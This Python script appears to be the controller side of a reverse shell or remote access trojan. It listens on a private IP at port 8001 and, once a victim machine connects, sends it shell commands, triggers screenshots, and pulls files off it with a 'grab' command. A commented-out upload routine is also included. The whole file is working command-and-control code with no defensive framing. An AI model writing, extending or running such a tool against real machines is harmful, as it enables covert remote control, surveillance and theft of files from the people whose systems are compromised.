import socket
import os

IDENTIFIER="XYZ"
size=2024


if __name__=="__main__":
    x=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ip="192.168.111.128"
    port=8001
    b_ip=(ip,port)
    x.bind(b_ip)
    x.listen(5)
    print("listening for incoming connection")
    z,y=x.accept()
    print("connection established with",y)
    try:
        while True:
            cmd=input("\n enter the command \n")
            z.send(cmd.encode())
            if cmd=="stop":
                z.close()
                break
            elif cmd=="":
                continue
            elif cmd.startswith("cd"):
                z.send(cmd.encode())
            elif cmd=="screenshot":
                z.send(cmd.encode())
                print("screenshot is taking.....")
            elif cmd.startswith("grab"):
                z.send(cmd.encode())
                ans=z.recv(1024)
                if ans.decode()=="yes":

                    print("file exists>>>")
                    filex=cmd.strip("grab ")

                    with open(filex, "wb") as good:
                        print("\n file is downloading.... ")
                        while True:
                            chunk=z.recv(size)
                            if chunk.endswith(IDENTIFIER.encode()):
                                chunk=chunk[:-len(IDENTIFIER)]
                                good.write(chunk)
                                break
                            good.write(chunk)
                    print("\n >>> downloaded >>> ",filex)
                else:
                    print("\n u r stupid file was not found ")
                    continue
            # elif cmd.startswith("upload"):
            #         x.send(cmd.encode())
            #         filex=cmd.split(maxsplit=1)[1]

            #         #filex=cmd1.strip("grab ")
            #         if os.path.exists(filex):
            #             ans="yes"
            #             x.send(ans.encode())

            #             with open(filex, "rb") as X:
            #                 chunk=X.read(size)
            #                 while len(chunk)>0:
            #                     x.send(chunk)
            #                     chunk=X.read(size)
            #                 x.send(IDENTIFIER.encode())
            #             print("send was done successful ")
            #         else:
            #             print("nope wrong path bro")
            #             ans="no"
            #             x.send(ans.encode())
            #             continue       


            else:
                full_result=b''
                while True:
                    data=z.recv(10024)
                    if data.endswith(IDENTIFIER.encode()):
                        data=data[:-len(IDENTIFIER)]
                        full_result+=data
                        break
                    full_result+=data
                print(full_result.decode("cp1252"))
    except KeyboardInterrupt as err:
        print("Exting...")
        z.close()
    except Exception as err:
        print(err)
        print("Exception occurs")
        z.close()
        
